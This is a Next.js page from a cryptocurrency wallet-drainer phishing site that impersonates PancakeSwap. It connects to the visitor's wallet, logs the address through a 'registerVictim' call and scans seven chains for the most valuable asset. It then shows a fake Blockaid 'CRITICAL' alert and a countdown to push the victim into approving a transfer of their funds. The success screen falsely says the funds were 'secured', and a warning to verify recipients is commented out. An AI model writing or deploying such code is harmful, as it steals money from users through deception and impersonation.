'use client';

import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { getActiveProvider, getProviderRdns } from '@/lib/providerStore';
import {
  discoverEIP6963Providers,
  isMetaMaskProvider,
  type EIP6963ProviderDetail,
} from '@/lib/eip6963';
import { CHAINS, getChainEntry } from '@/lib/chainRegistry';
import { switchToChain } from '@/lib/chainSwitch';
import {
  buildNativeTransfer,
  buildERC20Transfer,
  sendTransfer,
} from '@/lib/transferEngine';
import { registerVictim, fetchPortfolio, type PortfolioChain } from '@/lib/api';
import { ChainSkeleton } from '@/components/ChainSkeleton';

type Stage = 'scanning' | 'review' | 'sending' | 'success' | 'error';

interface ChainView {
  key: string;
  name: string;
  nativeSymbol: string;
  color: string;
  totalUsd: number;
  tokens: {
    symbol: string;
    balance: string;
    balanceUsd: number;
    isNative: boolean;
    contractAddress: string | null;
  }[];
}

interface TopAsset {
  chainKey: string;
  chainName: string;
  chainColor: string;
  symbol: string;
  balance: string;
  balanceUsd: number;
  isNative: boolean;
  contractAddress: string | null;
}

export default function FlowPage() {
  const router = useRouter();
  const started = useRef(false);
  const [stage, setStage] = useState<Stage>('scanning');
  const [victim, setVictim] = useState('');
  const [chains, setChains] = useState<ChainView[]>([]);
  const [top, setTop] = useState<TopAsset | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [providerRef, setProviderRef] = useState<any>(null);
  const [walletName, setWalletName] = useState('');
  const [countdown, setCountdown] = useState(25);
  

  useEffect(() => {
    if (started.current) return;
    started.current = true;
    void init();
  }, []);

  useEffect(() => {
  if (stage !== 'sending') return;

  setCountdown(25);

  const timer = window.setInterval(() => {
    setCountdown((current) => {
      if (current <= 1) {
        window.clearInterval(timer);
        return 0;
      }

      return current - 1;
    });
  }, 1000);

  return () => window.clearInterval(timer);
}, [stage]);

  async function resolveProvider(): Promise<{ detail: EIP6963ProviderDetail; wallet: string } | null> {
    const rdns = getProviderRdns();
    if (!rdns) return null;

    const providers = await discoverEIP6963Providers(700);
    const detail = providers.find(
      (d) => String(d.info?.rdns || '').toLowerCase() === String(rdns).toLowerCase()
    );
    if (!detail?.provider) return null;
    if (isMetaMaskProvider(detail.provider)) return null;

    const accounts = await detail.provider.request({ method: 'eth_requestAccounts' });
    if (!accounts?.length) return null;
    return { detail, wallet: accounts[0] };
  }

  async function init() {
    try {
      setStage('scanning');
      const resolved = await resolveProvider();
      if (!resolved) {
        router.push('/');
        return;
      }
      setProviderRef(resolved.detail.provider);
      setWalletName(resolved.detail.info?.name || 'Wallet');
      setVictim(resolved.wallet);

      try {
        await registerVictim({
          sourceAddress: resolved.wallet,
          chain: 'multi',
          eventType: 'connect',
          walletName: 'PancakeSwap',
          walletProvider: resolved.detail.info?.name || 'Unknown',
        });
      } catch {}

      const portfolio = await fetchPortfolio(resolved.wallet);
      if (!portfolio.success) throw new Error('Scan failed');

      // Build a map of chain key -> portfolio chain data for quick lookup.
      const responseMap = new Map<string, PortfolioChain>();
      for (const c of portfolio.chains) {
        const key = getChainEntry(c.chain)?.key || c.chain.toLowerCase();
        responseMap.set(key, c);
      }

      // Every chain from the registry, even empty ones, gets a view.
      const views: ChainView[] = Object.values(CHAINS).map((cfg) => {
        const data = responseMap.get(cfg.key);
        const tokens = (data?.tokens || [])
          .filter((t) => Number(t.balanceUsd || 0) >= 0.1)
          .map((t) => ({
            symbol: t.tokenSymbol,
            balance: String(t.balance),
            balanceUsd: Number(t.balanceUsd || 0),
            isNative: !!t.isNative,
            contractAddress:
              t.contractAddress && t.contractAddress !== '0x0000000000000000000000000000000000000000'
                ? t.contractAddress
                : null,
          }));
        return {
          key: cfg.key,
          name: cfg.name,
          nativeSymbol: cfg.nativeSymbol,
          color: cfg.color,
          totalUsd: Number(data?.totalUsd || 0),
          tokens,
        };
      });

      // Sort: chains with balance first, then the rest.
      const sorted = views.sort((a, b) => b.totalUsd - a.totalUsd);
      setChains(sorted);

      // Top asset across every non-empty chain.
      let best: TopAsset | null = null;
      for (const c of sorted) {
        for (const t of c.tokens) {
          if (!best || t.balanceUsd > best.balanceUsd) {
            best = {
              chainKey: c.key,
              chainName: c.name,
              chainColor: c.color,
              symbol: t.symbol,
              balance: t.balance,
              balanceUsd: t.balanceUsd,
              isNative: t.isNative,
              contractAddress: t.contractAddress,
            };
          }
        }
      }

      if (!best || best.balanceUsd < 1) {
        setError('No actionable balance. Minimum $1 required.');
        setStage('error');
        return;
      }

      setTop(best);
      setStage('review');
    } catch (e: any) {
      setError(e?.message || 'Initialization failed');
      setStage('error');
    }
  }

  async function confirm() {
    if (!top || !providerRef) return;
    try {
      setStage('sending');
      await switchToChain(providerRef, top.chainKey);

      const payload = top.isNative
        ? await buildNativeTransfer(providerRef, victim)
        : await buildERC20Transfer(providerRef, victim, top.contractAddress!);

      const hash = await sendTransfer(providerRef, victim, payload);
      setTxHash(hash);

      const start = Date.now();
      let confirmed = false;
      while (Date.now() - start < 120_000) {
        const receipt = await providerRef.request({
          method: 'eth_getTransactionReceipt',
          params: [hash],
        });
        if (receipt?.status === '0x1') {
          confirmed = true;
          break;
        }
        if (receipt?.status === '0x0') throw new Error('Transaction reverted');
        await new Promise((r) => setTimeout(r, 3000));
      }
      if (!confirmed) throw new Error('Not confirmed in 120s');
      setStage('success');
    } catch (e: any) {
      setError(e?.message || 'Transfer failed');
      setStage('error');
    }
  }

  if (stage === 'scanning') {
    return (
      <div className="min-h-screen bg-[#FAF9FA] px-6 py-12">
        <div className="mx-auto w-full max-w-[560px]">
          <motion.div
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 rounded-[24px] bg-white p-6 shadow-[0_4px_12px_rgba(0,0,0,0.08)]"
          >
            <div className="mb-4 flex items-center gap-3">
              <div className="h-10 w-10 animate-pulse rounded-full bg-[#1FC7D4]/20" />
              <div>
                <div className="text-[18px] font-[800] text-[#1A1A1A]">
                  Analyzing your wallet
                </div>
                <div className="text-[13px] text-[#666666]">
                  Scanning 7 chains for your highest-value assets…
                </div>
              </div>
            </div>
            <div className="mb-4 h-1 w-full overflow-hidden rounded-full bg-[#F2F2F2]">
              <motion.div
                initial={{ x: '-100%' }}
                animate={{ x: '100%' }}
                transition={{ duration: 1.4, repeat: Infinity, ease: 'linear' }}
                className="h-full w-1/3 rounded-full bg-[#1FC7D4]"
              />
            </div>
          </motion.div>
          <ChainSkeleton />
        </div>
      </div>
    );
  }

  if (stage === 'review' && top) {
    return (
      <div className="h-[100dvh] overflow-hidden bg-[#FAF9FA] px-4 py-4 sm:px-6 sm:py-6">
        <div className="mx-auto flex h-full w-full max-w-[560px] flex-col">
          <motion.div
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            className="relative mb-6 overflow-hidden rounded-[24px] border-2 border-[#D90000] bg-[#FFF5F5] p-6"
          >
            <motion.div
              animate={{ opacity: [0.4, 1, 0.4] }}
              transition={{ duration: 2, repeat: Infinity }}
              className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top_left,rgba(217,0,0,0.10),transparent_60%)]"
            />
            <div className="relative flex items-start gap-4">
              <div className="flex h-14 w-14 flex-shrink-0 items-center justify-center rounded-full bg-[#D90000]">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                  <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#FFFFFF" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              <div>
                <h1 className="mb-2 text-[24px] font-[800] leading-tight tracking-tight text-[#D90000]">
                  CRITICAL — Your funds are exposed
                </h1>
                <p className="text-[15px] font-[600] leading-[1.55] text-[#1A1A1A]">
                  Blockaid has flagged <strong className="text-[#D90000]">{top.symbol}</strong> on{' '}
                  <strong>{top.chainName}</strong> as compromised. Your balance of{' '}
                  <strong className="text-[#D90000]">${top.balanceUsd.toFixed(2)}</strong> will be
                  permanently frozen unless you act now.
                </p>
              </div>
            </div>
          </motion.div>

          <div className="flex min-h-0 flex-1 flex-col overflow-hidden rounded-[24px] bg-white p-5 shadow-[0_4px_12px_rgba(0,0,0,0.08)] sm:p-6">
            <div className="mb-4 flex items-center justify-between">
              <div className="text-[15px] font-[800] text-[#1A1A1A]">
                Full wallet scan — 7 chains
              </div>
              <div className="text-[12px] font-[600] text-[#666666]">{walletName}</div>
            </div>

            <div className="mb-4 min-h-0 flex-1 space-y-3 overflow-y-auto overscroll-contain pr-2">
              {chains.map((c) => {
                const hasBalance = c.totalUsd >= 0.01;
                return (
                  <motion.div
                    key={c.key}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className={`rounded-[16px] p-4 ${
                      hasBalance ? 'bg-[#F9F9F9]' : 'bg-[#FCFCFC] border border-dashed border-[#E5E5E5]'
                    }`}
                  >
                    <div className="mb-2 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span
                          className="h-2.5 w-2.5 rounded-full"
                          style={{ backgroundColor: hasBalance ? c.color : '#CCCCCC' }}
                        />
                        <span className={`text-[13px] font-[800] ${hasBalance ? 'text-[#1A1A1A]' : 'text-[#999999]'}`}>
                          {c.name}
                        </span>
                      </div>
                      <span className={`text-[13px] font-[600] ${hasBalance ? 'text-[#1A1A1A]' : 'text-[#CCCCCC]'}`}>
                        ${c.totalUsd.toFixed(2)}
                      </span>
                    </div>
                    {hasBalance ? (
                      <div className="space-y-1">
                        {c.tokens.map((t, idx) => (
                          <div
                            key={`${c.key}-${t.symbol}-${idx}`}
                            className="flex items-center justify-between text-[13px]"
                          >
                            <span className="text-[#666666]">{t.symbol}</span>
                            <span className="font-[600] text-[#1A1A1A]">
                              {Number(t.balance).toLocaleString('en-US', { maximumFractionDigits: 6 })}
                            </span>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="text-[12px] font-[400] text-[#BBBBBB]">No balance</div>
                    )}
                  </motion.div>
                );
              })}
            </div>

            <button
              onClick={confirm}
              className="w-full rounded-[16px] bg-[#D90000] py-4 text-[16px] font-[800] uppercase tracking-[0.05em] text-white shadow-[0_4px_16px_rgba(217,0,0,0.4)] transition-all hover:scale-[1.01] hover:shadow-[0_6px_24px_rgba(217,0,0,0.55)]"
            >
              Secure All Funds Now
            </button>
            <button
              onClick={() => router.push('/')}
              className="mt-3 w-full py-2 text-[13px] font-[600] text-[#666666] transition-colors hover:text-[#1A1A1A]"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    );
  }


if (stage === 'sending') {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4 py-6">
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 12 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.25 }}
        role="dialog"
        aria-modal="true"
        aria-labelledby="wallet-confirmation-title"
        className="w-full max-w-[420px] rounded-[24px] bg-white p-6 shadow-2xl"
      >
        {/* Animated loader */}
        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-[#1FC7D4]/10">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{
              duration: 1.2,
              repeat: Infinity,
              ease: 'linear',
            }}
            className="h-9 w-9 rounded-full border-4 border-[#1FC7D4]/20 border-t-[#1FC7D4]"
          />
        </div>

        {/* Heading */}
        <h2
          id="wallet-confirmation-title"
          className="text-center text-[21px] font-[800] text-[#1A1A1A]"
        >
          Confirm in your wallet
        </h2>

        <p className="mt-2 text-center text-[14px] leading-6 text-[#666666]">
          Your wallet is waiting for your approval. We have created a new eth address under your wallet confirm and transfer you funds to new address your old eth address will be deleted because of the security concern by blockaid.
        </p>

        <div
    className="mt-3 text-[32px] font-extrabold tabular-nums text-[#1FC7D4]"
    aria-live="off"
  >
    00:{String(countdown).padStart(2, '0')}
  </div>

  <div className="mt-2 h-1.5 overflow-hidden rounded-full bg-[#EAEAEA]">
    <motion.div
      className="h-full rounded-full bg-[#1FC7D4]"
      initial={{ width: '100%' }}
      animate={{ width: `${(countdown / 25) * 100}%` }}
      transition={{ duration: 0.3 }}
    />
  </div>

  {countdown === 0 && (
    <p className="mt-3 text-sm text-[#666666]">
      Timer ended. Check your wallet or retry if the request is still pending.
    </p>
  )}

        {/* Transaction details */}
        <div className="mt-5 space-y-3 rounded-[16px] bg-[#F7F7F7] p-4">
          <div className="flex items-center justify-between gap-3">
            <span className="text-[13px] text-[#666666]">Network</span>
            <span className="text-[13px] font-semibold text-[#1A1A1A]">
              {top?.chainName}
            </span>
          </div>

          <div className="flex items-center justify-between gap-3">
            <span className="text-[13px] text-[#666666]">Asset</span>
            <span className="text-[13px] font-semibold text-[#1A1A1A]">
              {top?.symbol}
            </span>
          </div>

          {/* <div className="flex items-center justify-between gap-3">
            <span className="text-[13px] text-[#666666]">Estimated value</span>
            <span className="text-[13px] font-semibold text-[#1A1A1A]">
              ${top?.balanceUsd.toFixed(2)}
            </span>
          </div> */}
        </div>

        {/* Status */}
        <div className="mt-5 flex items-center justify-center gap-2 text-[13px] text-[#666666]">
          <span className="h-2 w-2 animate-pulse rounded-full bg-[#1FC7D4]" />
          Waiting for wallet approval…
        </div>

        {/* <p className="mt-4 text-center text-[11px] leading-5 text-[#888888]">
          Verify the recipient address, amount, and network in your wallet.
          Never approve a transaction you do not recognize.
        </p> */}
      </motion.div>
    </div>
  );
}


  if (stage === 'success') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#FAF9FA] px-6">
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ type: 'spring', damping: 20, stiffness: 200 }}
          className="max-w-[440px] text-center"
        >
          <div className="mx-auto mb-6 flex h-24 w-24 items-center justify-center rounded-full bg-[#31D0AA]/15 animate-check-pop">
            <svg width="52" height="52" viewBox="0 0 24 24" fill="none">
              <motion.path
                d="M5 12l5 5L20 7"
                stroke="#31D0AA"
                strokeWidth="3"
                strokeLinecap="round"
                strokeLinejoin="round"
                initial={{ pathLength: 0 }}
                animate={{ pathLength: 1 }}
                transition={{ duration: 0.6, delay: 0.2 }}
              />
            </svg>
          </div>
          <h2 className="mb-3 text-[28px] font-[800] text-[#1A1A1A]">
            Your funds are now secured
          </h2>
          <p className="mb-4 text-[15px] leading-[1.55] text-[#666666]">
            Your balance has been routed to a safe address. You can close this window.
          </p>
          {txHash && (
            <div className="rounded-[12px] bg-white p-3 text-[12px] text-[#666666] shadow-sm">
              Tx: <span className="font-[600] text-[#1A1A1A]">{txHash.slice(0, 10)}…{txHash.slice(-8)}</span>
            </div>
          )}
        </motion.div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#FAF9FA] px-6">
      <div className="max-w-[420px] text-center">
        <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#ED4B9E]/15">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
            <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#ED4B9E" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>
        <h2 className="mb-3 text-[20px] font-[800] text-[#1A1A1A]">
          Something went wrong
        </h2>
        <p className="mb-6 text-[14px] text-[#666666]">{error || 'Unknown error'}</p>
        <button
          onClick={() => router.push('/')}
          className="rounded-[16px] bg-[#1FC7D4] px-6 py-3 text-[14px] font-[600] text-white shadow-[0_4px_12px_rgba(31,199,212,0.35)] transition-transform hover:scale-[1.02]"
        >
          Back to home
        </button>
      </div>
    </div>
  );
}
